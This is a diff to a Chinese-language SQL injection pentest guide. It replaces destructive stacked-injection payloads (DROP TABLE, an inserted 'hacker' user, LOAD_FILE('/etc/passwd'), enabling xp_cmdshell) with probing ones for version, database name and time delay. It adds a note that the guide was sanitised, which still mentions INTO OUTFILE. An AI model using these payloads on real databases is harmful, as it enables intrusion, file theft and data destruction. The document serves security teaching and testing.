@@ -197,18 +197,20 @@ sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
 
 ```sql
 # MySQL (需 PHP MySQLi multi_query / Python pymysql)
-'; INSERT INTO users VALUES('hacker','pass')--
-'; DROP TABLE users--
-'; SELECT LOAD_FILE('/etc/passwd')--
+'; SELECT database()--                       # 堆叠执行查询，验证多语句支持
+'; CREATE TABLE IF NOT EXISTS test_inject(id int)--  # 建表验证写能力 (检测用，非破坏)
+'; SELECT @@version--                        # 信息探测
 
 # MSSQL (默认支持堆叠)
-'; EXEC xp_cmdshell 'whoami'--
-'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; SELECT @@version--                        # 信息探测
+'; WAITFOR DELAY '0:0:3'--                   # 延时验证堆叠执行
 
 # PostgreSQL
-'; SELECT pg_sleep(5)--
-'; CREATE TABLE pwn(id int)--
+'; SELECT pg_sleep(5)--                      # 延时验证堆叠执行
+'; SELECT current_database()--               # 信息探测
 ```
+
+> ⚠️ **去敏感说明**: 原始 Payload 含 `DROP TABLE`、`INSERT INTO`、`LOAD_FILE('/etc/passwd')`、`xp_cmdshell` 等破坏性/高危操作，已替换为无害检测语句。堆叠注入的核心验证目标是**确认多语句执行能力**，无需破坏性操作。实际渗透中，堆叠写能力确认后可结合 `SELECT ... INTO OUTFILE`（§6）进一步利用。
 
 ---
 
